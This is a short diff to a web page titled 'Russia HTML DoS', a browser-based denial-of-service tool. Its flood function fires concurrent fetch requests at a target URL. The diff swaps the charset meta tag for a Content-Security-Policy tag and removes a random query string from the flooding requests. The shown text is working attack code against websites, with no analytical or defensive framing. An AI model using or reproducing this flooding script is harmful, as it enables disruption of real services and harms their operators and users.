@@ -1,5 +1,5 @@
 <html>
-    <head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <head><meta http-equiv="Content-Security-Policy" content="*">
   <title>Russia HTML DoS</title>
 </head>
 <body>
@@ -156,9 +156,8 @@ async function flood(target) {
     if (queue.length > CONCURRENCY_LIMIT) {
       await queue.shift()
     }
-    rand = i % 13 === 0 ? '' : ('?' + Math.floor(Math.random() * 1000))
     queue.push(
-      fetchWithTimeout(target+rand, { timeout: 1000 })
+      fetchWithTimeout(target, { timeout: 1000 })
         .catch((error) => {
           if (error.code === 20 /* ABORT */) {
             return;
